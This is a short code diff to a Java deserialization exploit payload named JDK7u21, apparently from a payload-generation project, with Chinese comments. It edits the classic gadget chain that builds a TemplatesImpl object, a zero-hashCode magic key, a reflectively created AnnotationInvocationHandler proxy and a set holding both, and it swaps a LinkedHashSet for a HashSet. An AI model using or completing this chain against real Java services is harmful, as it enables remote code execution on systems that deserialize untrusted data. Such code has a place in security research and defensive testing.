@@ -1,4 +1,4 @@
-package org.payload.yuansheng.JDK7u21;
+package org.payload.yuansheng.jdk7u21;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import javax.xml.transform.Templates;
 import java.io.ByteArrayInputStream;
@@ -23,7 +23,7 @@ public class JDK7u21 {
 
         // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value随便设置一个值.
         HashMap map = new HashMap();
-        map.put(zeroHashCodeStr, "any");
+        map.put(zeroHashCodeStr, "11");
 
         // 实例化AnnotationInvocationHandler类
         Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").
@@ -38,7 +38,8 @@ public class JDK7u21 {
                 tempHandler);
 
         // 实例化HashSet，并将两个对象放进去
-        HashSet set = new LinkedHashSet();
+        //HashSet set = new LinkedHashSet();
+        HashSet set = new HashSet();
         set.add(templates);
         set.add(proxy);
 
